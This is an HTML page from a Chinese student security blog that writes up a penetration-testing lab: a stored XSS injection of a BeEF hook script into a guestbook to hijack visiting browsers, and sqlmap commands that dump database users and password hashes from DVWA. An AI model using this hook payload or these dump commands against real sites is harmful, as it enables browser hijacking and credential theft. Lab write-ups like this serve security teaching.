@@ -1,0 +1,292 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>渗透实验三xss与sql注入 | FakerCsr's Magic Box</title><meta name="keywords" content="信息安全,sql注入,xss"><meta name="author" content="FakerCsr"><meta name="copyright" content="FakerCsr"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="渗透实验三xss与sql注入XSS部分：利用Beef劫持被攻击者客户端浏览器实验环境搭建角色：留言簿网站。存在XSS漏洞；（IIS或Apache、guestbook搭建） 攻击者：Kali（使用beEF生成恶意代码，并通过留言方式提交到留言簿网站）； 被攻击者：访问留言簿网站，浏览器被劫持。 两个以桥接模式连接 利用AWVS扫描留言簿网站，发现其存在XSS漏洞   说明存在xss漏洞 Kali使用">
+<meta property="og:type" content="article">
+<meta property="og:title" content="渗透实验三xss与sql注入">
+<meta property="og:url" content="http://fakercsr.github.io/posts/b878f198/index.html">
+<meta property="og:site_name" content="FakerCsr&#39;s Magic Box">
+<meta property="og:description" content="渗透实验三xss与sql注入XSS部分：利用Beef劫持被攻击者客户端浏览器实验环境搭建角色：留言簿网站。存在XSS漏洞；（IIS或Apache、guestbook搭建） 攻击者：Kali（使用beEF生成恶意代码，并通过留言方式提交到留言簿网站）； 被攻击者：访问留言簿网站，浏览器被劫持。 两个以桥接模式连接 利用AWVS扫描留言簿网站，发现其存在XSS漏洞   说明存在xss漏洞 Kali使用">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://gitee.com/csrcsyh/note/raw/master/img/20211212231923.png">
+<meta property="article:published_time" content="2021-12-06T10:08:16.000Z">
+<meta property="article:modified_time" content="2021-12-12T15:20:24.621Z">
+<meta property="article:author" content="FakerCsr">
+<meta property="article:tag" content="信息安全">
+<meta property="article:tag" content="sql注入">
+<meta property="article:tag" content="xss">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gitee.com/csrcsyh/note/raw/master/img/20211212231923.png"><link rel="shortcut icon" href="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png"><link rel="canonical" href="http://fakercsr.github.io/posts/b878f198/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="manifest" href="/pwa/manifest.json"/><link rel="apple-touch-icon" sizes="180x180" href="/pwa/apple-touch-icon.png"/><link rel="icon" type="image/png" sizes="32x32" href="/pwa/32.png"/><link rel="icon" type="image/png" sizes="16x16" href="/pwa/16.png"/><link rel="mask-icon" href="/pwa/safari-pinned-tab.svg" color="#5bbad5"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":500},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '渗透实验三xss与sql注入',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-12-12 23:20:24'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="./css/my.css"><style type="text/css">.app-refresh{position:fixed;top:-2.2rem;left:0;right:0;z-index:99999;padding:0 1rem;font-size:15px;height:2.2rem;transition:all .3s ease}.app-refresh-wrap{display:flex;color:#fff;height:100%;align-items:center;justify-content:center}.app-refresh-wrap a{color:#fff;text-decoration:underline;cursor:pointer}</style><meta name="generator" content="Hexo 5.4.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "/./img/loading.gif" data-lazy-src="http://q1.qlogo.cn/g?b=qq&amp;nk=979280582&amp;s=640" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">31</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">23</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">18</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首頁</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 時間軸</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 標籤</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分類</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清單</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音樂</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 電影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友鏈</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 關於</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://gitee.com/csrcsyh/note/raw/master/img/20211212231923.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">FakerCsr's Magic Box</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首頁</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 時間軸</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 標籤</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分類</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清單</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音樂</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 電影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友鏈</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 關於</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">渗透实验三xss与sql注入</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-12-06T10:08:16.000Z" title="发表于 2021-12-06 18:08:16">2021-12-06</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-12-12T15:20:24.621Z" title="更新于 2021-12-12 23:20:24">2021-12-12</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/">信息安全</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E6%B8%97%E9%80%8F/">渗透</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="渗透实验三xss与sql注入"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="渗透实验三xss与sql注入"><a href="#渗透实验三xss与sql注入" class="headerlink" title="渗透实验三xss与sql注入"></a>渗透实验三xss与sql注入</h1><h1 id="XSS部分：利用Beef劫持被攻击者客户端浏览器"><a href="#XSS部分：利用Beef劫持被攻击者客户端浏览器" class="headerlink" title="XSS部分：利用Beef劫持被攻击者客户端浏览器"></a>XSS部分：利用Beef劫持被攻击者客户端浏览器</h1><h2 id="实验环境搭建"><a href="#实验环境搭建" class="headerlink" title="实验环境搭建"></a>实验环境搭建</h2><p>角色：留言簿网站。存在XSS漏洞；（IIS或Apache、guestbook搭建）</p>
+<p>攻击者：Kali（使用beEF生成恶意代码，并通过留言方式提交到留言簿网站）；</p>
+<p>被攻击者：访问留言簿网站，浏览器被劫持。</p>
+<p>两个以桥接模式连接</p>
+<h2 id="利用AWVS扫描留言簿网站，发现其存在XSS漏洞"><a href="#利用AWVS扫描留言簿网站，发现其存在XSS漏洞" class="headerlink" title="利用AWVS扫描留言簿网站，发现其存在XSS漏洞"></a>利用AWVS扫描留言簿网站，发现其存在XSS漏洞</h2><p><img src= "/./img/loading.gif" data-lazy-src="https://gitee.com/csrcsyh/note/raw/master/img/20211212194306.png" alt="image-20211212194306726"></p>
+<p><img src= "/./img/loading.gif" data-lazy-src="https://gitee.com/csrcsyh/note/raw/master/img/20211212194727.png" alt="image-20211212194727946"></p>
+<p><img src= "/./img/loading.gif" data-lazy-src="https://gitee.com/csrcsyh/note/raw/master/img/20211212195253.png" alt="image-20211212195124495"></p>
+<p>说明存在xss漏洞</p>
+<h2 id="Kali使用beef生成恶意代码"><a href="#Kali使用beef生成恶意代码" class="headerlink" title="Kali使用beef生成恶意代码"></a>Kali使用beef生成恶意代码</h2><p>启动beef</p>
+<p><img src= "/./img/loading.gif" data-lazy-src="https://gitee.com/csrcsyh/note/raw/master/img/20211212223744.png" alt="image-20211212223743881"></p>
+<p>浏览器输入：<a target="_blank" rel="noopener" href="http://127.0.0.1:3000/ui/panel%EF%BC%8CUsename%E4%B8%8EPassword%E5%9D%87%E4%B8%BAbeef">http://127.0.0.1:3000/ui/panel，Usename与Password均为beef</a></p>
+<p><img src= "/./img/loading.gif" data-lazy-src="https://gitee.com/csrcsyh/note/raw/master/img/20211212195819.png" alt="image-20211212195819721"></p>
+<p>挂马：将下图所示的Hook URL写入web服务器存在XSS漏洞的留言板中</p>
+<p><img src= "/./img/loading.gif" data-lazy-src="https://gitee.com/csrcsyh/note/raw/master/img/20211212224015.png" alt="image-20211212223743881"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;http://192.168.43.96:3000/hook.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="访问留言簿进行留言"><a href="#访问留言簿进行留言" class="headerlink" title="访问留言簿进行留言"></a>访问留言簿进行留言</h2><p>访问http://留言簿网站/message.asp;将以下恶意代码写入网站留言板</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;http://Kali的IP地址:3000/hook.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src= "/./img/loading.gif" data-lazy-src="https://gitee.com/csrcsyh/note/raw/master/img/20211212224101.png" alt="image-20211212224101907"></p>
+<h2 id="劫持成功"><a href="#劫持成功" class="headerlink" title="劫持成功"></a>劫持成功</h2><p>管理员登录login.html，账号密码均为admin，审核用户留言。只要客户端访问这个服务器的留言板，客户端浏览器就会被劫持，指定被劫持网站为学校主页，将你在beff中的配置截图。</p>
+<p>windows管理员登录该网站，此时已被控制</p>
+<p><img src= "/./img/loading.gif" data-lazy-src="https://gitee.com/csrcsyh/note/raw/master/img/20211212224649.png" alt="image-20211212224649660"></p>
+<p>kali可通过beef控制这台主机</p>
+<p><img src= "/./img/loading.gif" data-lazy-src="https://gitee.com/csrcsyh/note/raw/master/img/20211212224733.png" alt="image-20211212224733505"></p>
+<p>谁访问谁就会被控</p>
+<p>将链接改成我的博客地址</p>
+<p><img src= "/./img/loading.gif" data-lazy-src="https://gitee.com/csrcsyh/note/raw/master/img/20211212225013.png" alt="image-20211212225013053"></p>
+<p>执行成功</p>
+<p><img src= "/./img/loading.gif" data-lazy-src="https://gitee.com/csrcsyh/note/raw/master/img/20211212225033.png" alt="image-20211212225033130"></p>
+<p><img src= "/./img/loading.gif" data-lazy-src="https://gitee.com/csrcsyh/note/raw/master/img/20211212230148.png" alt="image-20211212230148088"></p>
+<p><img src= "/./img/loading.gif" data-lazy-src="https://gitee.com/csrcsyh/note/raw/master/img/20211212230229.png" alt="image-20211212230229009"></p>
+<p>成功将留言界面拦截，变成我的博客地址</p>
+<p>5、回答问题：实验中XSS攻击属于哪种类型？</p>
+<p>存储型XSS</p>
+<h1 id="SQL注入部分：DVWA-SQLmap-Mysql注入实战"><a href="#SQL注入部分：DVWA-SQLmap-Mysql注入实战" class="headerlink" title="SQL注入部分：DVWA+SQLmap+Mysql注入实战"></a>SQL注入部分：DVWA+SQLmap+Mysql注入实战</h1><p>实验环境搭建。启动Metasploitable2虚拟机</p>
+<p><img src= "/./img/loading.gif" data-lazy-src="https://gitee.com/csrcsyh/note/raw/master/img/20211212192003.png" alt="1.jpg"></p>
+<h1 id="注入点发现，首先肯定是要判断是否有注入漏洞"><a href="#注入点发现，首先肯定是要判断是否有注入漏洞" class="headerlink" title="注入点发现，首先肯定是要判断是否有注入漏洞"></a>注入点发现，首先肯定是要判断是否有注入漏洞</h1><p>在输入框输入1，返回</p>
+<p>ID: 1</p>
+<p>First name: admin</p>
+<p>Surname: admin</p>
+<p>返回正常；</p>
+<p>再次输入1’，报错，返回</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#x27;&#x27;1&#x27;&#x27;&#x27; at line 1</span><br></pre></td></tr></table></figure>
+
+<p>此时可以断定有SQL注入漏洞，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://IP地址/DVWA-master/vulnerabilities/sqli/?id=22&amp;Submit=Submit#</span><br></pre></td></tr></table></figure>
+
+<p>下面利用SQLMap进行注入攻击。将DVWA安全级别设置为最低；</p>
+<h1 id="枚举当前使用的数据库名称和用户名"><a href="#枚举当前使用的数据库名称和用户名" class="headerlink" title="枚举当前使用的数据库名称和用户名"></a>枚举当前使用的数据库名称和用户名</h1><p>你输入的命令：                              </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u &quot;http://192.168.222.133/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; <span class="comment">--cookie=&#x27;security=low;PHPSESSID=71a97dbbc9bd90809d54b3daa90f4037&#x27; -b --current-db --current-user</span></span><br></pre></td></tr></table></figure>
+
+
+
+<blockquote>
+<p>·    -u ：指定目标URL，即注入点</p>
+<p>·    –cookies：当前会话的cookies值</p>
+<p>·    -b：获取数据库类型，检索数据库管理系统标识</p>
+<p>·    –current-db：获取当前数据库</p>
+<p>·    –current-user：获取当前登录数据库使用的用户</p>
+</blockquote>
+<p>Sqlmap输出截图。</p>
+<p><img src= "/./img/loading.gif" data-lazy-src="https://gitee.com/csrcsyh/note/raw/master/img/20211212192107.png" alt="image-20211205152703268">   </p>
+<h1 id="枚举数据库用户名和密码"><a href="#枚举数据库用户名和密码" class="headerlink" title="枚举数据库用户名和密码"></a>枚举数据库用户名和密码</h1><p> 你输入的命令：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u &quot;http://192.168.222.133/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; <span class="comment">--cookie=&#x27;security=low;PHPSESSID=71a97dbbc9bd90809d54b3daa90f4037&#x27; --users --password</span></span><br></pre></td></tr></table></figure>
+
+
+
+<blockquote>
+<p>–users：枚举数据库用户名</p>
+<p>–password：枚举数据库用户的密码（hash）</p>
+</blockquote>
+<p><img src= "/./img/loading.gif" data-lazy-src="https://gitee.com/csrcsyh/note/raw/master/img/20211212192127.png" alt="image-20211205152857634"></p>
+<p>​                                     </p>
+<p>Sqlmap输出截图</p>
+<p><img src= "/./img/loading.gif" data-lazy-src="https://gitee.com/csrcsyh/note/raw/master/img/20211212191642.png" alt="image-20211205153222925"></p>
+<h1 id="枚举数据库和指定数据库的数据表"><a href="#枚举数据库和指定数据库的数据表" class="headerlink" title="枚举数据库和指定数据库的数据表"></a>枚举数据库和指定数据库的数据表</h1><p>你输入的命令：</p>
+<p>​                                     </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u &quot;http://192.168.222.133/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; <span class="comment">--cookie=&#x27;security=low;PHPSESSID=71a97dbbc9bd90809d54b3daa90f4037&#x27; -D dvwa --tables</span></span><br></pre></td></tr></table></figure>
+
+
+
+<blockquote>
+<p> -D 数据库名：指定数据库</p>
+<p>-tables: 数据库dvwa中所有的表</p>
+</blockquote>
+<p>Sqlmap输出截图</p>
+<p><img src= "/./img/loading.gif" data-lazy-src="https://gitee.com/csrcsyh/note/raw/master/img/20211212191642.png" alt="image-20211205153222925"></p>
+<h1 id="获取指定数据库和表中所有列的信息"><a href="#获取指定数据库和表中所有列的信息" class="headerlink" title="获取指定数据库和表中所有列的信息"></a>获取指定数据库和表中所有列的信息</h1><p>你输入的命令：                  </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u &quot;http://192.168.222.133/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; <span class="comment">--cookie=&#x27;security=low;PHPSESSID=71a97dbbc9bd90809d54b3daa90f4037&#x27; -D dvwa -T users --columns</span></span><br></pre></td></tr></table></figure>
+
+
+
+<blockquote>
+<p>·    -D：指定的数据库</p>
+<p>·    -T：指定数据库中的数据表</p>
+<p>·    –columns：获取列的信息</p>
+</blockquote>
+<p>Sqlmap输出截图</p>
+<p><img src= "/./img/loading.gif" data-lazy-src="https://gitee.com/csrcsyh/note/raw/master/img/20211212192557.png" alt="image-20211205153252757"></p>
+<h1 id="枚举指定数据表中的所有用户名与密码-并down到本地"><a href="#枚举指定数据表中的所有用户名与密码-并down到本地" class="headerlink" title="枚举指定数据表中的所有用户名与密码,并down到本地"></a>枚举指定数据表中的所有用户名与密码,并down到本地</h1><p>你输入的命令：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u &quot;http://192.168.222.133/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; <span class="comment">--cookie=&#x27;security=low;PHPSESSID=71a97dbbc9bd90809d54b3daa90f4037&#x27; -D dvwa -T users -C user,password --dump</span></span><br></pre></td></tr></table></figure>
+
+
+
+<blockquote>
+<p>·    -C：枚举数据表中的列</p>
+<p>·    –dump：存储数据表项</p>
+</blockquote>
+<p>Sqlmap输出截图</p>
+<p><img src= "/./img/loading.gif" data-lazy-src="https://gitee.com/csrcsyh/note/raw/master/img/20211212192548.png" alt="image-20211205153313695"></p>
+<p>查看down到本地的用户名与密码，截图。（提示带.的文件夹为隐藏，在图形命令下，用文件浏览器打开文件夹，按下ctrl+h组合键可显示隐藏文件合文件夹，再按一次取消显示。）</p>
+<p><img src= "/./img/loading.gif" data-lazy-src="https://gitee.com/csrcsyh/note/raw/master/img/20211212192548.png" alt="image-20211205155745766"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">FakerCsr</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://fakercsr.github.io/posts/b878f198/">http://fakercsr.github.io/posts/b878f198/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://FakerCsr.github.io" target="_blank">FakerCsr's Magic Box</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/">信息安全</a><a class="post-meta__tags" href="/tags/sql%E6%B3%A8%E5%85%A5/">sql注入</a><a class="post-meta__tags" href="/tags/xss/">xss</a></div><div class="post_share"><div class="social-share" data-image="https://gitee.com/csrcsyh/note/raw/master/img/20211212231923.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/b42f4bd7/"><img class="prev-cover" src= "/./img/loading.gif" data-lazy-src="https://gitee.com/csrcsyh/note/raw/master/img/20211202150620.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">vulnhub DC1 靶场练习</div></div></a></div><div class="next-post pull-right"><a href="/posts/96e3061b/"><img class="next-cover" src= "/./img/loading.gif" data-lazy-src="https://www.traceable.ai/wp-content/uploads/2021/09/6039c84e695ede694324b40d_owaspcode-1.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">OWASP TOP 10</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/posts/289d493d/" title="CTFshow-web入门-信息搜集"><img class="cover" src= "/./img/loading.gif" data-lazy-src="https://gitee.com/csrcsyh/note/raw/master/img/20211014202000.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-10-06</div><div class="title">CTFshow-web入门-信息搜集</div></div></a></div><div><a href="/posts/ecd8242f/" title="CTFshow-web入门-命令执行"><img class="cover" src= "/./img/loading.gif" data-lazy-src="https://gitee.com/csrcsyh/note/raw/master/img/20211014202005.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-10-08</div><div class="title">CTFshow-web入门-命令执行</div></div></a></div><div><a href="/posts/24486494/" title="CTF命令执行与绕过"><img class="cover" src= "/./img/loading.gif" data-lazy-src="https://gitee.com/csrcsyh/note/raw/master/img/20211029183532.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-10-29</div><div class="title">CTF命令执行与绕过</div></div></a></div><div><a href="/posts/bb34e501/" title="Easy File Sharing Web Server 漏洞的简单利用"><img class="cover" src= "/./img/loading.gif" data-lazy-src="https://gitee.com/csrcsyh/note/raw/master/img/20211013131617.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-11-04</div><div class="title">Easy File Sharing Web Server 漏洞的简单利用</div></div></a></div><div><a href="/posts/528a1924/" title="GXYCTF2019_Ping Ping Ping"><img class="cover" src= "/./img/loading.gif" data-lazy-src="https://gitee.com/csrcsyh/note/raw/master/img/20211013131644.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-01-29</div><div class="title">GXYCTF2019_Ping Ping Ping</div></div></a></div><div><a href="/posts/96e3061b/" title="OWASP TOP 10"><img class="cover" src= "/./img/loading.gif" data-lazy-src="https://www.traceable.ai/wp-content/uploads/2021/09/6039c84e695ede694324b40d_owaspcode-1.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-12-02</div><div class="title">OWASP TOP 10</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src= "/./img/loading.gif" data-lazy-src="http://q1.qlogo.cn/g?b=qq&amp;nk=979280582&amp;s=640" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">FakerCsr</div><div class="author-info__description">Welcome to Magic Box</div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">31</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">23</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">18</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/FackCsr" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="/979280582@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" 